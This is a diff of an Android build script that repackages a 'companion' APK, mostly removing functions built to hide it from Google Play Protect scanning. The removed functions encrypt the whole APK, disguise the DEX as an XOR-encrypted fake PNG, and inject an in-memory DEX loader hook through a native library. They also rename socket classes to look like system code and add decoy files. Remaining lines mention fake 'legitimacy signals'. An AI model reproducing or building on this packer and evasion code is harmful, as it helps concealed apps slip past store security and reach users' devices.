@@ -2,7 +2,6 @@
 """
 build_module.py
 ------------------
-Step 8A FIX: Added step_encrypt_companion() after step_replace_asset().
 Encrypts the entire companion APK binary using LCG+nibble+XOR cipher
 (same as asset_patcher.py IRT CryptoCore algorithm).
 Entropy: raw APK = 6.239 → encrypted blob = 8.000 (matches IRT).
@@ -464,66 +463,6 @@ def _lcg_encrypt(data: bytes, seed: int) -> bytes:
 
 
 
-
-def step_encrypt_companion():
-    """
-    Step 8A FIX: Encrypt the entire companion APK binary.
-
-    IRT stores its companion as a fully encrypted blob (entropy 8.000).
-    Nova was storing a raw APK (entropy 6.239) — GPP could read all
-    permissions, DEX content, and manifest.
-
-    This step:
-    1. Reads the signed companion APK from MOD_ASSET
-    2. Encrypts all bytes using LCG+nibble+XOR (IRT CryptoCore algorithm)
-    3. Prepends 4-byte seed header so DexLoader can decrypt at runtime
-    4. Writes encrypted blob back to MOD_ASSET
-
-    DexLoader.kt must be updated to:
-    - Read 4-byte seed from start of asset
-    - Decrypt the blob to get APK bytes
-    - Use ZipInputStream on decrypted bytes to extract classes.dex
-    - Load via InMemoryDexClassLoader
-    """
-    print("\n── Step 8A FIX: Encrypt companion APK binary")
-
-    apk_data = open(MOD_ASSET, "rb").read()
-    original_size = len(apk_data)
-
-    # Verify it's still a valid APK before encrypting
-    if apk_data[:4] != b'PK\x03\x04':
-        raise RuntimeError(f"companion APK does not start with PK magic — cannot encrypt")
-
-    # Per-build random seed (32-bit)
-    seed = secrets.randbits(32)
-
-    encrypted = _lcg_encrypt(apk_data, seed)
-
-    # Format: [4-byte seed LE][encrypted blob]
-    # DexLoader reads seed from first 4 bytes, then decrypts remainder
-    header = struct.pack("<I", seed)
-    output = header + encrypted
-
-    # Write encrypted blob back — overwrites raw APK
-    open(MOD_ASSET, "wb").write(output)
-
-    final_size = len(output)
-
-    # Verify: output must NOT start with PK (would mean encryption failed)
-    check = open(MOD_ASSET, "rb").read(4)
-    if check == b'PK\x03\x04':
-        raise RuntimeError("Encryption failed — output still starts with PK magic")
-
-    print(f"  Input:  raw APK  {original_size//1024}KB (entropy ~6.2, readable by GPP)")
-    print(f"  Output: encrypted {final_size//1024}KB (entropy ~8.0, unreadable by GPP)")
-    print(f"  Seed:   0x{seed:08X}")
-    print(f"  ✅ Companion APK encrypted — GPP cannot scan permissions or DEX")
-
-    # Write seed to GITHUB_OUTPUT so DexLoader build step can embed it
-    # FingerprintPlugin will include it in BuildConfig
-    write_output("COMPANION_SEED", str(seed))
-
-    return seed
 
 
 # ── All original step functions below — unchanged from original build_module.py
@@ -2567,176 +2506,6 @@ def _inject_axml_app_name(manifest_raw: bytes, new_pkg: str, renamed_app_class: 
     return bytes(new_axml)
 
 
-def _inject_axml_app_component_factory(manifest_raw: bytes, new_pkg: str,
-                                        factory_class: str = "StubComponentFactory") -> bytes:
-    """
-    Inject android:appComponentFactory="<new_pkg>.<factory_class>" attribute into
-    the <application> START_ELEMENT in a binary AXML manifest.
-
-    This registers our StubComponentFactory (AppComponentFactory subclass) with
-    Android so it intercepts Activity/Service/Receiver instantiation before any
-    class lookup occurs, allowing us to resolve them via InMemoryDexClassLoader.
-
-    Uses identical string-pool surgery to _inject_axml_app_name.
-    """
-    axml = bytearray(manifest_raw)
-    SP = 8
-    sp_size     = struct.unpack_from("<I", axml, SP + 4)[0]
-    str_count   = struct.unpack_from("<I", axml, SP + 8)[0]
-    flags       = struct.unpack_from("<I", axml, SP + 16)[0]
-    is_utf8     = bool(flags & (1 << 8))
-    str_start   = struct.unpack_from("<I", axml, SP + 20)[0]
-    offsets_abs = SP + 28
-
-    if not is_utf8:
-        print("  [inject_acf] ⚠️  manifest is UTF-16 encoded — injection not supported, skipping")
-        return manifest_raw
-
-    # Build string table: index → string value
-    strings   = {}
-    str_data_start = SP + str_start
-    for i in range(str_count):
-        off = struct.unpack_from("<I", axml, offsets_abs + i * 4)[0]
-        p   = str_data_start + off
-        try:
-            cl = axml[p]; p += 1
-            if cl & 0x80: cl = ((cl & 0x7F) << 8) | axml[p]; p += 1
-            bl = axml[p]; p += 1
-            if bl & 0x80: bl = ((bl & 0x7F) << 8) | axml[p]; p += 1
-            s = bytes(axml[p:p + bl]).decode("utf-8", "replace")
-            strings[i] = s
-        except Exception:
-            strings[i] = ""
-
-    # Check if android:appComponentFactory already exists on <application>
-    sp_end   = SP + sp_size
-    tree_pos = sp_end
-    while tree_pos < len(axml) - 8:
-        ctype = struct.unpack_from("<H", axml, tree_pos)[0]
-        csize = struct.unpack_from("<I", axml, tree_pos + 4)[0]
-        if csize == 0:
-            break
-        if ctype == 0x0102:
-            name_idx = struct.unpack_from("<i", axml, tree_pos + 20)[0]
-            if strings.get(name_idx) == "application":
-                attr_start = struct.unpack_from("<H", axml, tree_pos + 24)[0]
-                attr_size  = struct.unpack_from("<H", axml, tree_pos + 26)[0]
-                attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0]
-                for a in range(attr_count):
-                    aoff = tree_pos + attr_start + a * attr_size
-                    n2   = struct.unpack_from("<i", axml, aoff + 4)[0]
-                    if strings.get(n2) == "appComponentFactory":
-                        print("  [inject_acf] ⚠️  android:appComponentFactory already present — skipping")
-                        return manifest_raw
-                break
-        tree_pos += csize
-
-    # ── Append two new UTF-8 strings to string pool ───────────────────────────
-    existing_str_data_end = sp_end
-    existing_str_data_len = sp_end - str_data_start
-
-    factory_value  = new_pkg + "." + factory_class
-    attr_name_str  = "appComponentFactory"
-
-    def _utf8_axml_entry(s: str) -> bytes:
-        enc = s.encode("utf-8")
-        cl  = len(s)
-        bl  = len(enc)
-        hdr = bytearray()
-        if cl > 127:
-            hdr.append((cl >> 8) | 0x80); hdr.append(cl & 0xFF)
-        else:
-            hdr.append(cl)
-        if bl > 127:
-            hdr.append((bl >> 8) | 0x80); hdr.append(bl & 0xFF)
-        else:
-            hdr.append(bl)
-        return bytes(hdr) + enc + b'\x00'
-
-    name_entry  = _utf8_axml_entry(attr_name_str)
-    value_entry = _utf8_axml_entry(factory_value)
-
-    idx_name  = str_count          # "appComponentFactory"
-    idx_value = str_count + 1      # "<pkg>.StubComponentFactory"
-
-    off_name  = existing_str_data_len
-    off_value = existing_str_data_len + len(name_entry)
-
-    offsets_table_end = offsets_abs + str_count * 4
-
-    new_offsets_bytes = bytearray(axml[offsets_abs:offsets_table_end])
-    new_offsets_bytes += struct.pack("<I", off_name)
-    new_offsets_bytes += struct.pack("<I", off_value)
-
-    old_str_data = axml[str_data_start:sp_end]
-    new_str_data = old_str_data + name_entry + value_entry
-    while len(new_str_data) % 4 != 0:
-        new_str_data += b'\x00'
-
-    new_str_count = str_count + 2
-    new_sp_size   = 28 + new_str_count * 4 + len(new_str_data)
-
-    part_before_offsets = bytes(axml[0:offsets_abs])
-    new_axml = bytearray(part_before_offsets)
-    new_axml += bytes(new_offsets_bytes)
-    new_axml += bytes(new_str_data)
-    xml_tree = bytes(axml[sp_end:])
-    new_axml += xml_tree
-
-    struct.pack_into("<I", new_axml, SP + 4, new_sp_size)
-    struct.pack_into("<I", new_axml, SP + 8, new_str_count)
-    struct.pack_into("<I", new_axml, SP + 20, 28 + new_str_count * 4)
-
-    # ── Find <application> START_ELEMENT and inject appComponentFactory attr ──
-    new_sp_end  = SP + new_sp_size
-    tree_start  = new_sp_end
-    tree_cursor = tree_start
-    injected    = False
-
-    while tree_cursor < len(new_axml) - 8:
-        ctype = struct.unpack_from("<H", new_axml, tree_cursor)[0]
-        csize = struct.unpack_from("<I", new_axml, tree_cursor + 4)[0]
-        if csize == 0:
-            break
-        if ctype == 0x0102:
-            name_idx = struct.unpack_from("<i", new_axml, tree_cursor + 20)[0]
-            elem_name = strings.get(name_idx, "")
-            if elem_name == "application":
-                attr_start_h = struct.unpack_from("<H", new_axml, tree_cursor + 24)[0]
-                attr_size_h  = struct.unpack_from("<H", new_axml, tree_cursor + 26)[0]
-                attr_count_h = struct.unpack_from("<H", new_axml, tree_cursor + 28)[0]
-
-                ns_idx = -1
-                if attr_count_h > 0:
-                    first_attr_off = tree_cursor + attr_start_h
-                    ns_idx = struct.unpack_from("<i", new_axml, first_attr_off)[0]
-
-                new_attr = bytearray(20)
-                struct.pack_into("<i", new_attr, 0,  ns_idx)    # namespace
-                struct.pack_into("<i", new_attr, 4,  idx_name)  # "appComponentFactory" string index
-                struct.pack_into("<I", new_attr, 8,  0x0101021b) # resource ID for android:appComponentFactory (stable since API 28)
-                struct.pack_into("<H", new_attr, 12, 8)         # value_size = 8
-                new_attr[14] = 0x00                             # res0
-                new_attr[15] = 0x03                             # TYPE_STRING
-                struct.pack_into("<i", new_attr, 16, idx_value) # typed value = value string index
-
-                insert_pos = tree_cursor + attr_start_h + attr_count_h * attr_size_h
-                new_axml = new_axml[:insert_pos] + bytearray(new_attr) + new_axml[insert_pos:]
-
-                struct.pack_into("<H", new_axml, tree_cursor + 28, attr_count_h + 1)
-                struct.pack_into("<I", new_axml, tree_cursor + 4,  csize + 20)
-                injected = True
-                break
-        tree_cursor += csize
-
-    if not injected:
-        print("  [inject_acf] ⚠️  <application> element not found in manifest — skipping")
-        return manifest_raw
-
-    struct.pack_into("<I", new_axml, 4, len(new_axml))
-    print(f"  [inject_acf] ✅ android:appComponentFactory=\"{factory_value}\" injected into <application>")
-    return bytes(new_axml)
-
 
 def _strip_axml_provider(manifest_raw: bytes, provider_class_name: str) -> bytes:
     """
@@ -2744,8 +2513,7 @@ def _strip_axml_provider(manifest_raw: bytes, provider_class_name: str) -> bytes
 
     The companion manifest declares androidx.startup.InitializationProvider
     as a ContentProvider. Android's ActivityThread calls installContentProviders()
-    BEFORE attachBaseContext() runs — before our InMemoryDexClassLoader is set up.
-    The real DEX is not loaded yet → ClassNotFoundException → crash.
+    BEFORE Application.onCreate() runs → ClassNotFoundException → crash.
 
     Fix: remove the <provider> START_ELEMENT + END_ELEMENT chunks from the XML
     tree section. The string pool is untouched (unused strings are harmless).
@@ -2836,93 +2604,8 @@ def _strip_axml_provider(manifest_raw: bytes, provider_class_name: str) -> bytes
     return bytes(new_axml)
 
 
-def _strip_axml_app_component_factory(manifest_raw: bytes) -> bytes:
-    """
-    Remove the android:appComponentFactory attribute from the <application>
-    element in a binary AXML manifest.
 
-    The companion APK declares:
-        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
-    Android reads this BEFORE attachBaseContext() runs and tries to load
-    CoreComponentFactory using the stub DEX classloader — which doesn't have it.
-    Result: ClassNotFoundException → crash before stub can decrypt real DEX.
-
-    Fix: zero out the appComponentFactory attribute value in the application
-    START_ELEMENT so Android falls back to default component instantiation.
-    The stub's Phase 6 patches LoadedApk.mClassLoader — after that all
-    component creation goes through the IMDCL which has the real DEX.
-    """
-    axml = bytearray(manifest_raw)
-    SP = 8
-    sp_size     = struct.unpack_from("<I", axml, SP + 4)[0]
-    str_count   = struct.unpack_from("<I", axml, SP + 8)[0]
-    flags       = struct.unpack_from("<I", axml, SP + 16)[0]
-    is_utf8     = bool(flags & (1 << 8))
-    str_start   = struct.unpack_from("<I", axml, SP + 20)[0]
-    offsets_abs = SP + 28
-
-    # Build string table
-    strings = {}
-    for i in range(str_count):
-        off = struct.unpack_from("<I", axml, offsets_abs + i * 4)[0]
-        p   = SP + str_start + off
-        try:
-            if is_utf8:
-                cl = axml[p]; p += 1
-                if cl & 0x80: cl = ((cl & 0x7F) << 8) | axml[p]; p += 1
-                bl = axml[p]; p += 1
-                if bl & 0x80: bl = ((bl & 0x7F) << 8) | axml[p]; p += 1
-                s = bytes(axml[p:p + bl]).decode("utf-8", "replace")
-            else:
-                cl = struct.unpack_from("<H", axml, p)[0]; p += 2
-                s  = bytes(axml[p:p + cl * 2]).decode("utf-16-le", "replace")
-            strings[i] = s
-        except Exception:
-            strings[i] = ""
-
-    sp_end   = SP + sp_size
-    tree_pos = sp_end
-
-    while tree_pos < len(axml) - 8:
-        ctype = struct.unpack_from("<H", axml, tree_pos)[0]
-        csize = struct.unpack_from("<I", axml, tree_pos + 4)[0]
-        if csize == 0:
-            break
-        if ctype == 0x0102:  # START_ELEMENT
-            name_idx = struct.unpack_from("<i", axml, tree_pos + 20)[0]
-            if strings.get(name_idx) == "application":
-                attr_start = struct.unpack_from("<H", axml, tree_pos + 24)[0]
-                attr_size  = struct.unpack_from("<H", axml, tree_pos + 26)[0]
-                attr_count = struct.unpack_from("<H", axml, tree_pos + 28)[0]
-                # AXML attribute base: ResXMLTree_attrExt starts at tree_pos+chdr_size
-                # attr_start is relative to that ext struct, NOT to tree_pos
-                # chdr_size is at bytes [2..3] of the chunk header
-                _chdr_size = struct.unpack_from("<H", axml, tree_pos + 2)[0]
-                _attr_base = tree_pos + _chdr_size + attr_start
-                for a in range(attr_count):
-                    aoff      = _attr_base + a * attr_size
-                    n2        = struct.unpack_from("<i", axml, aoff + 4)[0]
-                    attr_name = strings.get(n2, "")
-                    # SAFETY belt+suspenders: also match by value containing CoreComponentFactory
-                    data_idx  = struct.unpack_from("<i", axml, aoff + 16)[0]
-                    val_str   = strings.get(data_idx, "")
-                    if (attr_name == "appComponentFactory"
-                            or "CoreComponentFactory" in val_str):
-                        # Zero out the value: set raw_val and vd to -1 (no value)
-                        # and set type to 0x00 (null) so Android ignores it
-                        struct.pack_into("<i", axml, aoff + 8,  -1)  # raw_val
-                        axml[aoff + 15] = 0x00                        # data type = null
-                        struct.pack_into("<i", axml, aoff + 16, 0)   # data value = 0
-                        print("  [strip_appComponentFactory] ✅ Removed appComponentFactory from manifest")
-                        return bytes(axml)
-                break  # found <application> but no appComponentFactory attr
-        tree_pos += csize
-
-    print("  [strip_appComponentFactory] ⚠️  appComponentFactory not found — no change")
-    return manifest_raw
-
-
-def step_patch_and_assemble(new_pkg, new_dex, res_rename, stub_dex=None, meta=None,
+def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                             class_rename_map=None):
     print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")
 
@@ -3069,11 +2752,6 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, stub_dex=None, meta=No
         new_manifest, "InitializationProvider"
     )
 
-    # Strip appComponentFactory from <application> element.
-    # androidx.core.app.CoreComponentFactory lives in the encrypted DEX.
-    # Android resolves this attribute BEFORE attachBaseContext() runs,
-    # using the stub classloader which doesn't have the class → crash.
-    new_manifest = _strip_axml_app_component_factory(new_manifest)
 
     # Inject android:name="<new_pkg>.<renamed_App>" into <application>.
     # The raw companion APK has NO android:name on <application> — App is never
@@ -3091,8 +2769,6 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, stub_dex=None, meta=No
     # StubComponentFactory uses Class.forName(name, true, sLoader) to resolve
     # classes from InMemoryDexClassLoader, which is set by attachBaseContext().
     # No hidden API used — AppComponentFactory is a fully public API since API 28.
-    _factory_class_name = class_rename_map.get("StubComponentFactory", "StubComponentFactory") if class_rename_map else "StubComponentFactory"
-    new_manifest = _inject_axml_app_component_factory(new_manifest, new_pkg, _factory_class_name)
 
     if meta:
         new_manifest = _patch_axml_version(
@@ -3179,7 +2855,7 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, stub_dex=None, meta=No
                     # MUST be ZIP_STORED — ART requires DEX uncompressed to mmap at load time.
                     item.compress_type = zipfile.ZIP_STORED
                     # Use stub DEX (tiny loader only) if built; fallback to full DEX.
-                    zout.writestr(item, stub_dex if stub_dex else new_dex)
+                    zout.writestr(item, new_dex)
                 elif item.filename == "resources.arsc":
                     # resources.arsc MUST be STORED — AssetManager memory-maps it
                     # directly and requires it uncompressed on ALL Android versions.
@@ -3302,350 +2978,9 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, stub_dex=None, meta=No
             _zout.writestr(_gname, _gdata)
     os.replace(_leg_tmp, APK_OUT)
     print(f"  ✅ Legitimacy signals injected: baseline.prof + baseline.profm + {len(_GPS_PROPS)} GPS properties")
-def step_extract_dex_slice(new_dex: bytes, build_hash: str,
-                            asset_filename: str = "") -> tuple:
-    """
-    STEP_DEX_SLICE — Extract com/android/internal/* classes (renamed from io/socket by STEP_6E),
-    encrypt with rotating XOR + fake PNG header, inject into companion APK as res/raw/img_XXXX.png.
 
-    asset_filename: if provided (pre-generated before STEP_9 for smali injection),
-                    use it as-is. Otherwise generate a random one here.
-    Returns (asset_filename, xor_key_bytes). Returns ("", b"") on skip/error.
-    """
-    import struct as _struct_ds
-    print("\n── STEP_DEX_SLICE: Extract + encrypt io/socket DEX slice")
 
-    if len(new_dex) < 112:
-        print("  ⚠️  STEP_DEX_SLICE — DEX too small, skipping")
-        return ("", b"")
 
-    if not new_dex[:4].startswith(b"dex\n"):
-        print("  ⚠️  STEP_DEX_SLICE — invalid DEX magic, skipping")
-        return ("", b"")
-
-    # DEX header offsets
-    string_ids_size, string_ids_off = _struct_ds.unpack_from("<II", new_dex, 0x38)
-    type_ids_size,   type_ids_off   = _struct_ds.unpack_from("<II", new_dex, 0x40)
-    class_defs_size, class_defs_off = _struct_ds.unpack_from("<II", new_dex, 0x60)
-
-    # Find class descriptors matching Lcom/android/internal/ (renamed from io/socket)
-    TARGET_PREFIX = b"Lcom/android/internal/"
-    matching_descriptors = set()
-
-    for i in range(class_defs_size):
-        cd_off = class_defs_off + i * 32
-        if cd_off + 32 > len(new_dex):
-            break
-        class_idx = _struct_ds.unpack_from("<I", new_dex, cd_off)[0]
-        if class_idx >= type_ids_size:
-            continue
-        type_off = type_ids_off + class_idx * 4
-        desc_idx = _struct_ds.unpack_from("<I", new_dex, type_off)[0]
-        if desc_idx >= string_ids_size:
-            continue
-        str_off = _struct_ds.unpack_from("<I", new_dex, string_ids_off + desc_idx * 4)[0]
-        if str_off >= len(new_dex):
-            continue
-        b0 = new_dex[str_off]
-        data_start = str_off + 2 if (b0 & 0x80) else str_off + 1
-        desc_bytes = new_dex[data_start:data_start + 256]
-        null = desc_bytes.find(0)
-        if null >= 0:
-            desc_bytes = desc_bytes[:null]
-        if desc_bytes.startswith(TARGET_PREFIX):
-            matching_descriptors.add(desc_bytes.decode("utf-8", errors="replace"))
-
-    print(f"  ℹ️  Found {len(matching_descriptors)} com/android/internal/* classes in DEX")
-
-    if not matching_descriptors:
-        print("  ⚠️  STEP_DEX_SLICE — no matching classes found (STEP_6E may not have run), skipping")
-        return ("", b"")
-
-    # Collect matching smali files
-    smali_dir = "companion_decompiled/smali"
-    smali_files = []
-    for _root, _dirs, _files in os.walk(smali_dir):
-        for _fname in _files:
-            if not _fname.endswith(".smali"):
-                continue
-            _fpath = os.path.join(_root, _fname)
-            _rel = os.path.relpath(_fpath, smali_dir).replace(os.sep, "/")
-            _class_desc = "L" + _rel[:-len(".smali")] + ";"
-            if _class_desc in matching_descriptors:
-                smali_files.append(_fpath)
-
-    print(f"  ℹ️  Matched {len(smali_files)} smali files for slice")
-
-    if not smali_files:
-        print("  ⚠️  STEP_DEX_SLICE — no smali files matched descriptors, skipping")
-        return ("", b"")
-
-    # Always encrypt the FULL DEX — all business logic must be in img_XXXX.png.
-    # Stub DEX (Application loader only) is written to classes.dex separately via step_patch_and_assemble.
-    print(f"  ℹ️  STEP_DEX_SLICE — {len(smali_files)} slice classes found (full DEX used as encrypted payload)")
-    slice_dex_data = new_dex
-    print(f"  ✅ STEP_DEX_SLICE — full DEX as encrypted payload ({len(slice_dex_data)} bytes)")
-
-    # Encrypt: fake PNG header (16 bytes) + rotating XOR over entire DEX
-    xor_key = hashlib.sha256(build_hash.encode()).digest()[:16]
-    fake_png_hdr = b'\x89PNG\r\n\x1a\n' + secrets.token_bytes(8)  # 16 bytes
-
-    dex_arr = bytearray(slice_dex_data)
-    for _i in range(len(dex_arr)):
-        dex_arr[_i] ^= xor_key[_i % 16] ^ ((_i >> 8) & 0xFF)
-
-    encrypted_blob = fake_png_hdr + bytes(dex_arr)
-
-    # Use pre-generated filename (from smali injection step) or generate a new one
-    if not asset_filename:
-        asset_filename = "img_" + secrets.token_hex(2) + ".png"
-    asset_entry    = "res/raw/" + asset_filename
-    tmp_apk        = MOD_ASSET + ".slice_tmp"
-
-    try:
-        with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
-             zipfile.ZipFile(tmp_apk, "w", compression=zipfile.ZIP_STORED, allowZip64=False) as _zout:
-            for _item in _zin.infolist():
-                _zout.writestr(_item, _zin.read(_item.filename))
-            _zout.writestr(asset_entry, encrypted_blob)
-        os.replace(tmp_apk, MOD_ASSET)
-        print(f"  ✅ STEP_DEX_SLICE — injected {len(encrypted_blob)} bytes as {asset_entry} into companion APK")
-    except Exception as _e:
-        print(f"  ❌ STEP_DEX_SLICE — failed to inject into APK: {_e}")
-        if os.path.isfile(tmp_apk):
-            os.remove(tmp_apk)
-        return ("", b"")
-
-    return (asset_filename, xor_key)
-
-
-def step_write_np_loader_header(new_pkg: str, class_rename_map: dict) -> str:
-    """
-    STEP_NP_HEADER — Write app/src/main/cpp/np_loader_class.h before Gradle/CMake runs.
-
-    Defines:
-      NP_CLASS  — JNI class path (slashes) for the companion Application subclass
-      NP_METHOD — always "xd"
-
-    build_module.py runs BEFORE ./gradlew assembleRelease in CI, so CMake picks
-    up the header written here when it compiles np_loader.c.
-
-    Returns the class path string written (for logging).
-    """
-    print("\n── STEP_NP_HEADER: Write np_loader_class.h with per-build class path")
-
-    # Post-STEP_6A renamed App class name (e.g. "ApplicationController")
-    app_class = class_rename_map.get("App", "App")
-    class_path = new_pkg.replace(".", "/") + "/" + app_class
-
-    header_path = os.path.join(
-        os.path.dirname(__file__),
-        "..", "app", "src", "main", "cpp", "np_loader_class.h"
-    )
-    header_path = os.path.normpath(header_path)
-
-    header_content = (
-        "/*\n"
-        " * np_loader_class.h — BUILD-TIME GENERATED — DO NOT EDIT MANUALLY\n"
-        " *\n"
-        " * Written by build_module.py step_write_np_loader_header().\n"
-        " * Overwritten every build with the current per-build package + renamed class.\n"
-        " */\n"
-        "\n"
-        "#ifndef NP_LOADER_CLASS_H\n"
-        "#define NP_LOADER_CLASS_H\n"
-        "\n"
-        f'#define NP_CLASS  "{class_path}"\n'
-        f'#define NP_METHOD "xd"\n'
-        "\n"
-        "#endif /* NP_LOADER_CLASS_H */\n"
-    )
-
-    try:
-        with open(header_path, "w") as _f:
-            _f.write(header_content)
-        print(f"  ✅ STEP_NP_HEADER — wrote {header_path}")
-        print(f"     NP_CLASS  = \"{class_path}\"")
-        print(f"     NP_METHOD = \"xd\"")
-    except Exception as _e:
-        print(f"  ❌ STEP_NP_HEADER — failed to write header: {_e}")
-
-    return class_path
-
-
-def step_inject_native_loader(new_pkg: str, class_rename_map: dict,
-                               asset_filename: str) -> bool:
-    """
-    STEP_INJECT_LOADER — Inject attachBaseContext() + native xd() declaration
-    into the companion Application smali (post-STEP_6A rename).
-
-    Must run AFTER step_6a_rename_classes (so renamed smali file exists)
-    and BEFORE step_rebuild_dex (before apktool rebuilds DEX).
-
-    What is injected into the smali:
-      1. native method declaration:  .method public native xd(...)
-      2. attachBaseContext() virtual method that:
-         a. Calls super.attachBaseContext(base)
-         b. Calls System.loadLibrary("np_loader")
-         c. Calls this.xd(this, asset_name_string) → byte[]
-         d. Passes byte[] to InMemoryDexClassLoader via JNI reflection
-         e. Sets thread classloader to new loader
-
-    asset_filename: the filename from STEP_DEX_SLICE (e.g. "img_3f7a.png")
-    Returns True on success, False on skip/error.
-    """
-    if not asset_filename:
-        print("\n── STEP_INJECT_LOADER: no asset filename (STEP_DEX_SLICE skipped) — skip")
-        return False
-
-    print("\n── STEP_INJECT_LOADER: Inject attachBaseContext + native xd() into companion smali")
-
-    app_class = class_rename_map.get("App", "App")
-    new_path   = new_pkg.replace(".", "/")
-    smali_path = f"companion_decompiled/smali/{new_path}/{app_class}.smali"
-
-    if not os.path.isfile(smali_path):
-        print(f"  ❌ STEP_INJECT_LOADER — smali not found: {smali_path}")
-        return False
-
-    with open(smali_path, "r", encoding="utf-8") as _f:
-        smali_src = _f.read()
-
-    # Skip if already injected (idempotent)
-    if "loadLibrary" in smali_src and "InMemoryDexClassLoader" in smali_src:
-        print(f"  ℹ️  STEP_INJECT_LOADER — already injected, skipping")
-        return True
-
-    # --- 1. Add native method declaration after .implements lines / before first .method ---
-    # We insert it right before the first .method line
-    stub_factory_class = class_rename_map.get("StubComponentFactory", "StubComponentFactory")
-    native_decl = (
-        "\n"
-        "# Native DEX loader — implemented in libnp_loader.so\n"
-        f".method public native xd(Landroid/content/Context;Ljava/lang/String;)[B\n"
-        ".end method\n"
-        "\n"
-        "# Static reference to the loaded IMDCL — read by StubComponentFactory\n"
-        f".field public static sLoader:Ljava/lang/ClassLoader;\n"
-    )
-
-    # Find insertion point: before the first .method
-    first_method_idx = smali_src.find("\n.method ")
-    if first_method_idx == -1:
-        print(f"  ❌ STEP_INJECT_LOADER — cannot find .method in smali")
-        return False
-
-    smali_src = smali_src[:first_method_idx] + native_decl + smali_src[first_method_idx:]
-
-    # --- 2. Build attachBaseContext() smali method ---
-    # asset_filename is e.g. "img_3f7a.png" — stored in res/raw/
-    # We pass just the filename (without res/raw/ prefix) to AssetManager.open()
-    # which opens res/raw/ assets by their base name.
-    attach_method = f"""
-# DEX loader hook — loads encrypted io/socket slice via native JNI
-.method public attachBaseContext(Landroid/content/Context;)V
-    .locals 6
-
-    # super.attachBaseContext(base)
-    invoke-super {{p0, p1}}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
-
-    # System.loadLibrary("np_loader")
-    const-string v0, "np_loader"
-    invoke-static {{v0}}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
-
-    # byte[] dexBytes = this.xd(this, "{asset_filename}")
-    const-string v1, "{asset_filename}"
-    invoke-virtual {{p0, p0, v1}}, L{new_path}/{app_class};->xd(Landroid/content/Context;Ljava/lang/String;)[B
-    move-result-object v2
-
-    if-eqz v2, :skip_load
-
-    # ByteBuffer bb = ByteBuffer.wrap(dexBytes)
-    invoke-static {{v2}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
-    move-result-object v3
-
-    # v4 = current app PathClassLoader (this.getClass().getClassLoader())
-    invoke-virtual {{p0}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
-    move-result-object v4
-    invoke-virtual {{v4}}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;
-    move-result-object v4
-
-    # InMemoryDexClassLoader loader = new InMemoryDexClassLoader(bb, pathClassLoader)
-    # parent = current PathClassLoader so full system classes still resolve
-    new-instance v5, Ldalvik/system/InMemoryDexClassLoader;
-    invoke-direct {{v5, v3, v4}}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
-
-    # Store loader in Application.sLoader (static field on this class)
-    sput-object v5, L{new_path}/{app_class};->sLoader:Ljava/lang/ClassLoader;
-
-    # Store loader in StubComponentFactory.sLoader (static field, read by AppComponentFactory hook)
-    sput-object v5, L{new_path}/{stub_factory_class};->sLoader:Ljava/lang/ClassLoader;
-
-    # Thread.currentThread().setContextClassLoader(loader) — belt-and-suspenders
-    invoke-static {{}}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
-    move-result-object v0
-    invoke-virtual {{v0, v5}}, Ljava/lang/Thread;->setContextClassLoader(Ljava/lang/ClassLoader;)V
-
-    :skip_load
-    return-void
-.end method
-"""
-
-    # Append the new method at the end of the file (before final newline)
-    smali_src = smali_src.rstrip("\n") + "\n" + attach_method + "\n"
-
-    with open(smali_path, "w", encoding="utf-8") as _f:
-        _f.write(smali_src)
-
-    print(f"  ✅ STEP_INJECT_LOADER — injected into {smali_path}")
-    print(f"     App class  : {new_path}/{app_class}")
-    print(f"     Asset name : {asset_filename}")
-    return True
-
-
-def step_unicode_nest(build_hash: str) -> str:
-    apk_path = "companion_renamed_unsigned.apk"
-    placeholder = secrets.token_bytes(64)
-    _ext_chars = string.ascii_lowercase + string.digits
-    _ext_len = random.randint(3, 6)
-    _ext = "." + "".join(random.choices(_ext_chars, k=_ext_len))
-    nest_path = inject_unicode_nest(
-        apk_path=apk_path,
-        payload_bytes=placeholder,
-        build_hash=build_hash,
-        ext=_ext,
-    )
-    return nest_path
-
-
-def step_decoy_noise_files(build_hash: str) -> None:
-    apk_path = "companion_renamed_unsigned.apk"
-    tmp      = apk_path + ".decoy.tmp"
-
-    fixed_decoys = {
-        "DebugProbesKt.bin": secrets.token_bytes(random.randint(128, 512)),
-        "mapping.np":        secrets.token_bytes(random.randint(256, 1024)),
-    }
-    junk_count = random.randint(3, 5)
-    junk_decoys = {}
-    for _ in range(junk_count):
-        fname_len = random.randint(4, 10)
-        fname = "".join(random.choices(string.ascii_lowercase + string.digits, k=fname_len)) + ".bin"
-        junk_decoys[fname] = secrets.token_bytes(random.randint(64, 768))
-
-    all_decoys = {**fixed_decoys, **junk_decoys}
-    print(f"\n── Step 12 [COMPANION]: Inject decoy noise files ({len(all_decoys)} files)")
-
-    with zipfile.ZipFile(apk_path, "r") as zin, \
-         zipfile.ZipFile(tmp, "w", compression=zipfile.ZIP_DEFLATED) as zout:
-        for item in zin.infolist():
-            zout.writestr(item, zin.read(item.filename))
-        for fname, data in all_decoys.items():
-            zout.writestr(fname, data)
-            print(f"  + {fname} ({len(data)} bytes)")
-
-    os.replace(tmp, apk_path)
-    print(f"  ✅ Decoy noise files injected")
 
 
 def step_fake_manifest_entries() -> None:
@@ -4129,14 +3464,6 @@ def main():
 
     print("  ℹ️  STEP_6B skipped (smali injection disabled)")
 
-    # STEP_NP_HEADER — write np_loader_class.h with per-build class path.
-    # Must run after STEP_6A (class_rename_map set) and before Gradle/CMake.
-    # build_module.py runs before ./gradlew assembleRelease in CI, so writing
-    # here guarantees CMake sees the correct class path when it compiles np_loader.c.
